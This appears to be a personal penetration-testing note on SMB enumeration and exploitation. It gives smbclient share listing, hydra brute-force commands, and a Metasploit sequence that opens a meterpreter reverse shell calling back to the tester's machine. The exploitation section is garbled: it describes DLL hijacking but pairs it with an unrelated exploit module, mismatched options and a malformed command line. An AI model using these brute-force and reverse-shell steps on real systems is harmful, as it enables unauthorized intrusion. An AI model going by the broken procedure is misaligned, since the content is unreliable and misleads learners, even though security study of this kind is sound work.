---
creation date: March 6th 2023
last modified date: March 6th 2023
aliases: []
tags: #📖
---

Primary Categories: [[03 - Network Service Discovery]]
Secondary Categories: 
Links: [[]] 
Search Tag: #📖  

---
# SMB Enumeration (Server Message Block)
---
## Introduction

SMB (Server Message Block) is a protocol used for sharing files, printers, and other resources between computers on a network. As a penetration tester, it's important to test the security of SMB to identify vulnerabilities that could be exploited by attackers. In this guide, we'll cover the key areas to focus on when testing SMB.

## Enumeration

The first step in testing SMB is to enumerate the available shares on the target system. This can be done using tools like `smbclient` or `enum4linux`. For example, you can use `smbclient` to list the available shares on a target system as follows:

```bash
smbclient -L $IP
```

Once you have identified the available shares, you should attempt to connect to them using known credentials or by attempting to guess weak passwords. For example, you can connect to a share using `smbclient` as follows:

``` bash
smbclient //<target IP address>/<share name> -U <username>
```

If you don't have valid credentials, you can attempt to brute-force the SMB login using tools like `hydra` or `medusa`. For example, you can use `hydra` to perform a dictionary attack against the SMB login as follows:

```bash
hydra -L <usernames file> -P <passwords file> smb://<target IP address>
```

## Exploitation

Once you have gained access to an SMB share, you can look for ways to escalate your privileges or access sensitive information. One common technique is to look for misconfigured file permissions that allow you to read or write files that you shouldn't have access to. For example, you can use `smbclient` to list the files in a share as follows:

```bash
smbclient //<target IP address>/<share name> -U <username> -c "ls"
```

You can also try to execute arbitrary code on the target system by uploading a malicious DLL file and forcing the system to load it using a technique called "DLL hijacking." For example, you can use `metasploit` to generate a malicious DLL file and upload it to a writable SMB share as follows:

```bash
use exploit/windows/smb/smb2_negotiate_func_index 
set RHOSTS <target IP address> 
set SMBFOLDER <share name> 
set SMBSHARE <share name> 
set RHOST <target IP address> 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST <your IP address> exploit
```

Once the DLL file is uploaded, you can use `metasploit` to execute it on the target system and gain a meterpreter shell.



___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: March 6th 2023 (09:51 am) 
Last Modified Date: March 6th 2023 (09:51 am)
